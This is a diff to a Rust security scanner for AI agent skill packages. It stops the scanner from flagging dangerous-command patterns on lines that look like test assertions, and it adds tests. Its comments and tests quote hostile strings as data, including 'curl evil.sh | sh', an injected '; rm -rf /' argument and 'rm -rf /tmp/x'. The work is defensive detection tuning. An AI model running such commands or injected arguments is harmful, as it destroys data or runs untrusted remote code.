@@ -688,8 +688,31 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
                 || line.contains("registry.yarnpkg.com")
                 || line.contains("crates.io")
         }
+        // A test asserts *about* a pattern; it does not perform it. GOLD-v4:
+        // `expect(tokenizeArgs("... curl evil.sh | sh"))` and
+        // `assert.throws(() => mod.sanitizeCodexArgs(['; rm -rf /']))` were
+        // reported as a pipe-to-shell and as a destructive command.
+        "DL_PIPE_TO_SHELL" | "SHELL_DESTRUCTIVE" | "SHELL_EVAL" | "SHELL_EXEC"
+        | "NET_HTTP_CLIENT" | "NET_FETCH_CALL" => looks_like_test(&line),
         _ => false,
     }
+}
+
+/// Does the line look like a test assertion or fixture?
+fn looks_like_test(line: &str) -> bool {
+    [
+        "expect(",
+        "assert",
+        "toequal",
+        "tobe(",
+        "tokenizeargs",
+        "describe(",
+        "unittest",
+        "pytest",
+        ".test(",
+    ]
+    .iter()
+    .any(|t| line.contains(t))
 }
 
 /// Does the match look like an encoded payload rather than a path or an
@@ -1543,6 +1566,42 @@ mod tests {
         assert!(!hits(&scan_skill(&d)).contains("OBFUSC_HOMOGLYPH"));
         fs::write(d.join("scripts/b.sh"), "\u{0441}url https://x\n").unwrap_or_default();
         assert!(hits(&scan_skill(&d)).contains("OBFUSC_HOMOGLYPH"));
+    }
+
+    /// GOLD-v4: a test assertion about a dangerous pattern is not the pattern.
+    #[test]
+    fn a_test_assertion_is_not_behaviour() {
+        assert!(suppress_match(
+            "SHELL_DESTRUCTIVE",
+            "expect(tokenizeArgs(\"client gas; rm -rf /\")).toEqual([",
+            "rm -rf /"
+        ));
+        assert!(suppress_match(
+            "SHELL_DESTRUCTIVE",
+            "assert.throws(() => mod.sanitizeCodexArgs(['; rm -rf /']), /invalid/i);",
+            "rm -rf /"
+        ));
+        assert!(!suppress_match(
+            "SHELL_DESTRUCTIVE",
+            "rm -rf /tmp/x",
+            "rm -rf /"
+        ));
+    }
+
+    /// GOLD-v4: `-P` matched the `-p` inside `pretty-prints` and `profile`.
+    #[test]
+    fn an_archive_password_needs_whitespace() {
+        let d = tmp("archive-password");
+        fs::write(d.join("SKILL.md"), "---\nname: x\ndescription: f\n---\n").unwrap_or_default();
+        fs::create_dir_all(d.join("scripts")).unwrap_or_default();
+        fs::write(
+            d.join("scripts/a.sh"),
+            "# Extracts the ZIP archive, pretty-prints XML files, and optionally:\nzip -qr \"$archive\" hinge-profile-optimizer\n",
+        )
+        .unwrap_or_default();
+        assert!(!hits(&scan_skill(&d)).contains("DL_PASSWORD_ARCHIVE"));
+        fs::write(d.join("scripts/b.sh"), "zip -P secret out.zip files/\n").unwrap_or_default();
+        assert!(hits(&scan_skill(&d)).contains("DL_PASSWORD_ARCHIVE"));
     }
 
     #[test]
